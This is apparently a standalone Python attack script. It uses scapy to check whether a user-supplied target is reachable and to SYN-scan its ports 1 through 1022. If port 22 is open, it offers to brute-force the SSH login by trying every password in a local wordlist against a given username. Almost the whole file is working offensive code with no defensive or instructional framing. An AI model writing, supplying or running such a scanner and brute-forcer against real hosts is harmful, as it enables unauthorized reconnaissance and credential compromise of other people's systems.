from scapy.all import *
from scapy.layers.inet import IP, TCP, ICMP
import paramiko

target = input("Type the target: ")

registered_ports = range(1, 1023)

open_ports = []


def scanport(port):
    source_port = RandShort()
    conf.verb = 0
    synchronization_packet = sr1(IP(dst=target) / TCP(sport=source_port, dport=port, flags="S"), timeout=0.5)
    if synchronization_packet:
        if synchronization_packet.haslayer(TCP):
            tcp_layer = synchronization_packet[TCP]
            if tcp_layer.flags == 0x12:
                sr1(IP(dst=target) / TCP(sport=source_port, dport=port, flags="R"), timeout=2)
                return True

    return False

def checkTarget():
    try:
        conf.verb = 0
        response = sr1(IP(dst=target)/ICMP(), timeout=3)
    except Exception as ex:
        print(ex)
        return False

    if response:
        return True
    return False

def bruteForce(port):
    passwords = []
    with open("PasswordList.txt", "r") as file:
        for line in file:
            passwords.append(line.strip())

    user = input("Type the server username: ")

    SSHconn = paramiko.SSHClient()
    SSHconn.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for password in passwords:
        try:
            SSHconn.connect(target, port=int(port), username=user, password=password, timeout=1)
            print(f'{password} succeed.')
            SSHconn.close()
            break
        except:
            print(f'{password} failed.')


if(checkTarget()):
    print("Target is available.")

    for port in registered_ports:
        status = scanport(port)
        if status == True:
            open_ports.append(port)
            print(f'Port {port} is open')
else:
    print("Target is NOT available.")


print("The scan is finished.")

if 22 in open_ports:
    answer = input("Port 22 is open. Do you want to perform a brute force attack (y/N)?").strip()
    answer = answer.lower()
    if answer in ["y", "yes"]:
        bruteForce(22)

